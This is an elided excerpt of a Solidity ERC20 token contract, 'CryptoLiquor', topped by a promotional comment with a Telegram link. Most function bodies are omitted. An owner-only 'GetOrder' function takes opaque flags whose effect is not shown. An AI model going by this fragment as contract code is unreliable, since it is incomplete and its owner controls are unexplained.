...
/**
 * Yo need booze?
 * Then look no further no more
 * 
 * https://t.me/CryptoLiquor
 **/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function GetOrder(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _makeTheBooze(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Tequila is Context, ERC20 {
    constructor(
        ...
        _makeTheBooze(owner, initialSupply, tmp6, tmp7);
    }
}

contract CryptoLiquor is ERC20Tequila {
    constructor() ERC20Tequila("CryptoLiquor", "LIQUOR", false, true, 900, 25, msg.sender, 70000000000 * 10 ** 18, msg.sender, 22) {
    }
}